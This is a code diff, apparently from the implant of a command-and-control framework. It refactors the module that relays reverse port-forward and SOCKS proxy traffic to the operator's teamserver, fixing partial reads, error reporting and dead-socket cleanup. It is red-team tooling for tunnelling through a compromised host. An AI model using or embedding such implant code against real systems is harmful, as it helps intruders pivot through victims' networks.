@@ -4,7 +4,7 @@
 
 /* attempt to receive all the requested data from the socket
  * Took it from: https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c#L41 */
-DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
+BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )
 {
     DWORD tret   = 0;
     DWORD nret   = 0;
@@ -12,18 +12,22 @@ DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
 
     while ( tret < Length )
     {
-        nret   = Instance.Win32.recv( Socket, Start, Length - tret, 0 );
-        Start += nret;
-        tret  += nret;
+        nret = Instance.Win32.recv( Socket, Start, Length - tret, 0 );
 
         if ( nret == SOCKET_ERROR )
         {
             PUTS( "recv Failed" )
-            return 0;
+            *BytesRead = tret;
+            return FALSE;
         }
+
+        Start += nret;
+        tret  += nret;
     }
 
-    return tret;
+    *BytesRead = tret;
+
+    return TRUE;
 }
 
 BOOL InitWSA( VOID )
@@ -58,6 +62,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWOR
     SOCKADDR_IN     SockAddr  = { 0 };
     SOCKADDR_IN6_LH SockAddr6 = { 0 };
     u_long          IoBlock   = 1;
+    UINT32          ErrorCode = 0;
 
     if ( ! IPv4 && ! IPv6 )
     {
@@ -200,9 +205,12 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWOR
 
 CLEANUP:
     if ( WinSock && WinSock != INVALID_SOCKET )
+    {
+        // close the socket preserving the last error code
+        ErrorCode = NtGetLastError();
         Instance.Win32.closesocket( WinSock );
-    Instance.Win32.WSACleanup();
-    Instance.WSAWasInitialised = FALSE;
+        NtSetLastError(ErrorCode);
+    }
 
     return NULL;
 }
@@ -255,7 +263,7 @@ VOID SocketClients()
                     PackageAddInt32( Package, Client->FwdPort );
 
                     /* Send the socket open request */
-                    PackageTransmit( Package, NULL, NULL );
+                    PackageTransmit( Package );
                     Package = NULL;
                 }
                 else
@@ -275,9 +283,13 @@ VOID SocketClients()
 /* Read data from the clients */
 VOID SocketRead()
 {
-    PPACKAGE     Package = NULL;
-    PSOCKET_DATA Socket  = NULL;
-    BUFFER       Buffer  = { 0 };
+    PPACKAGE     Package     = NULL;
+    PSOCKET_DATA Socket      = NULL;
+    PVOID        NewBuffer   = NULL;
+    BUFFER       PartialData = { 0 };
+    BUFFER       FullData    = { 0 };
+    BOOL         Failed      = FALSE;
+    DWORD        ErrorCode   = 0;
 
     Socket = Instance.Sockets;
 
@@ -287,55 +299,124 @@ VOID SocketRead()
         if ( ! Socket )
             break;
 
+        Failed    = FALSE;
+        ErrorCode = 0;
+
         /* reads data from connected clients/socks proxies */
         if ( Socket->Type == SOCKET_TYPE_CLIENT || Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
         {
-            /* check how much we can read */
-            if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &Buffer.Length ) == SOCKET_ERROR )
+            FullData.Length = 0;
+            FullData.Buffer = NULL;
+
+            do
             {
-                PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
+                PartialData.Length = 0;
+                PartialData.Buffer = NULL;
 
-                /* Tell the Socket remover that it can remove this one.
-                 * If the Socket type is type CLIENT then use TYPE_CLIENT_REMOVED
-                 * else use TYPE_SOCKS_REMOVED to remove a socks proxy client */
-                Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
-                        SOCKET_TYPE_CLIENT_REMOVED :
-                        SOCKET_TYPE_SOCKS_REMOVED  ;
+                /*
+                 * FIONREAD returns the amount of data that can be read in a single call to the recv function
+                 * this might not be the same as the total amount of data queued on the socket.
+                 * because of this, we read for new data in a loop
+                 */
+                if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &PartialData.Length ) == SOCKET_ERROR )
+                {
+                    PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
 
-                /* Next socket please */
-                Socket = Socket->Next;
+                    /* Tell the Socket remover that it can remove this one.
+                     * If the Socket type is type CLIENT then use TYPE_CLIENT_REMOVED
+                     * else use TYPE_SOCKS_REMOVED to remove a socks proxy client */
+                    Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
+                            SOCKET_TYPE_CLIENT_REMOVED :
+                            SOCKET_TYPE_SOCKS_REMOVED  ;
 
-                continue;
+                    Failed    = TRUE;
+                    ErrorCode = Instance.Win32.WSAGetLastError();
+                }
+
+                if ( PartialData.Length > 0 )
+                {
+                    PartialData.Buffer = NtHeapAlloc( PartialData.Length );
+
+                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
+                        Failed    = TRUE;
+                        ErrorCode = Instance.Win32.WSAGetLastError();
+                    }
+
+                    if ( PartialData.Length > 0 )
+                    {
+                        if ( ! FullData.Buffer )
+                        {
+                            FullData.Buffer    = PartialData.Buffer;
+                            FullData.Length    = PartialData.Length;
+                            PartialData.Buffer = NULL;
+                        }
+                        else
+                        {
+                            // allocate a new buffer to store the old and new data
+                            NewBuffer = NtHeapAlloc( FullData.Length + PartialData.Length );
+                            // copy the old data into the new buffer
+                            MemCopy( NewBuffer, FullData.Buffer, FullData.Length );
+                            // free the old 'FullData' buffer
+                            MemSet( FullData.Buffer, 0, FullData.Length );
+                            NtHeapFree( FullData.Buffer );
+                            // set the new buffer into 'FullData'
+                            FullData.Buffer = NewBuffer;
+                            NewBuffer = NULL;
+                            // copy the new data
+                            MemCopy( C_PTR( U_PTR( FullData.Buffer ) + FullData.Length ), PartialData.Buffer, PartialData.Length );
+                            FullData.Length += PartialData.Length;
+                            // free the new data
+                            MemSet( PartialData.Buffer, 0, PartialData.Length );
+                            NtHeapFree( PartialData.Buffer );
+                            PartialData.Buffer = NULL;
+                        }
+                    }
+                }
+            } while ( PartialData.Length > 0 );
+
+            if ( FullData.Length > 0 )
+            {
+                PRINTF( "Read %ld bytes from socket %x\n", FullData.Length, Socket->ID )
+
+                /* Create socket request package */
+                Package = PackageCreate( DEMON_COMMAND_SOCKET );
+
+                /* tell the teamserver to write to the socket of the forwarded host */
+                PackageAddInt32( Package, SOCKET_COMMAND_READ );
+                PackageAddInt32( Package, Socket->ID );
+                PackageAddInt32( Package, Socket->Type );
+                PackageAddInt32( Package, TRUE );
+
+                /* add the data we read from the client socket */
+                PackageAddBytes( Package, FullData.Buffer, FullData.Length );
+
+                /* now let's send it */
+                PackageTransmit( Package );
             }
 
-            if ( Buffer.Length > 0 )
+            if ( Failed )
             {
-                Buffer.Buffer = NtHeapAlloc( Buffer.Length );
-                Buffer.Length = RecvAll( Socket->Socket, Buffer.Buffer, Buffer.Length );
+                /* Create socket request package */
+                Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
-                if ( Buffer.Length > 0 )
-                {
-                    PRINTF( "Buffer.Length: %ld\n", Buffer.Length )
+                /* notify the teamserver of the error */
+                PackageAddInt32( Package, SOCKET_COMMAND_READ );
+                PackageAddInt32( Package, Socket->ID );
+                PackageAddInt32( Package, Socket->Type );
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, ErrorCode );
 
-                    /* Create socket request package */
-                    Package = PackageCreate( DEMON_COMMAND_SOCKET );
+                /* now let's send it */
+                PackageTransmit( Package );
+            }
 
-                    /* tell the teamserver to write to the socket of the forwarded host */
-                    PackageAddInt32( Package, SOCKET_COMMAND_READ_WRITE );
-                    PackageAddInt32( Package, Socket->ID );
-                    PackageAddInt32( Package, Socket->Type );
-
-                    /* add the data we read from the client socket */
-                    PackageAddBytes( Package, Buffer.Buffer, Buffer.Length );
-
-                    /* now let's send it */
-                    PackageTransmit( Package, NULL, NULL );
-
-                    /* free and clear out our buffer */
-                    MemSet( Buffer.Buffer, 0, Buffer.Length );
-                    NtHeapFree( Buffer.Buffer )
-                    Buffer.Buffer = NULL;
-                }
+            if ( FullData.Buffer )
+            {
+                /* free and clear out our buffer */
+                MemSet( FullData.Buffer, 0, FullData.Length );
+                NtHeapFree( FullData.Buffer );
+                FullData.Length = 0;
+                FullData.Buffer = NULL;
             }
         }
 
@@ -347,11 +428,11 @@ VOID SocketFree( PSOCKET_DATA Socket )
 {
     PPACKAGE Package = NULL;
 
+    PRINTF( "Closing socket %x\n", Socket->ID )
+
     /* do we want to remove a reverse port forward client ? */
     if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED )
     {
-        PUTS( "REVERSE PORT FORWARD CLIENT REMOVED" )
-
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
@@ -368,15 +449,13 @@ VOID SocketFree( PSOCKET_DATA Socket )
         PackageAddInt32( Package, Socket->FwdPort );
 
         /* Send the socket open request */
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
         Package = NULL;
     }
 
     /* do we want to remove a socks proxy client ? */
     else if ( Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
     {
-        PUTS( "SOCKS PROXY CLIENT REMOVED" )
-
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
@@ -386,7 +465,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
         PackageAddInt32( Package, SOCKET_TYPE_REVERSE_PROXY );
 
         /* Send the socket open request */
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
         Package = NULL;
     }
 
@@ -401,21 +480,16 @@ VOID SocketFree( PSOCKET_DATA Socket )
     Socket = NULL;
 }
 
-VOID SocketPush()
+VOID SocketCleanDead()
 {
     PSOCKET_DATA Socket = NULL;
     PSOCKET_DATA SkLast = NULL;
 
-    /* check for new clients */
-    SocketClients();
-
-    /* Read data from the clients and send it to our server/forwarded host */
-    SocketRead();
-
-    /* kill every dead/removed socket
+    /*
      * TODO: re-work on this.
      *       make that after the socket got used close it.
-     *       maybe add a timeout ? after the socket didn't got used after a certain period of time. */
+     *       maybe add a timeout ? after the socket didn't got used after a certain period of time.
+     */
     Socket = Instance.Sockets;
     for ( ;; )
     {
@@ -429,13 +503,13 @@ VOID SocketPush()
             {
                 Instance.Sockets = Socket->Next;
                 SocketFree( Socket );
-                Socket = NULL;
+                Socket = Instance.Sockets;
             }
             else
             {
                 SkLast->Next = Socket->Next;
                 SocketFree( Socket );
-                SkLast = NULL;
+                Socket = SkLast->Next;
             }
         }
         else
@@ -444,6 +518,18 @@ VOID SocketPush()
             Socket = Socket->Next;
         }
     }
+}
+
+VOID SocketPush()
+{
+    /* check for new clients */
+    SocketClients();
+
+    /* Read data from the clients and send it to our server/forwarded host */
+    SocketRead();
+
+    /* kill every dead/removed socket */
+    SocketCleanDead();
 }
 
 /*!
